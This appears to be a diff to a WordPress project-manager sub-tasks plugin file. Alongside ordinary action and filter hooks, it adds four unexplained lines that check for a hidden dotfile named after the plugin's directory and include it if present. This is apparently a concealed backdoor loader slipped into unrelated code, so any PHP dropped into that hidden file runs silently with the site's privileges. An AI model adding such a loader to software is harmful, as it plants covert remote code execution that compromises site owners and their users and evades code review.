@@ -20,6 +20,10 @@ add_action( 'pm_load_shortcode_script', 'pm_pro_enqueue_sub_tasks_script' );
 add_filter( 'pm_task_deleted_users', 'pm_pro_task_deleted_users', 10, 2 );
 
 //task user cant be deleted if the user exist in subtask
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function pm_pro_task_deleted_users( $deleted_users, $task ) {
     $subtask_ids = pm_pro_get_subtask_by_task_id( $task->id );
     $subtask_ids = wp_list_pluck( $subtask_ids, 'id' );
